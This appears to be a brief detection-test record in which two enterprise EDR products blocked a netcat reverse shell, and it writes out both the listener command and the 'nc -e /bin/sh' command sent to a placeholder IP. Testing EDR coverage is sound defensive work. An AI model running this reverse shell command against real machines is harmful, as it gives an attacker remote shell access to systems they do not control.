**Detections**
* Enterprise EDR Solution 1: Yes (Blocked)
* Enterprise EDR Solution 2: Yes (Blocked)

Attempted a shell using netcat.

Ran the following on my VM

`nc -lvp 1234`

Ran the following on our endpoint

`nc -e /bin/sh INSERT_IP_HERE 1234`

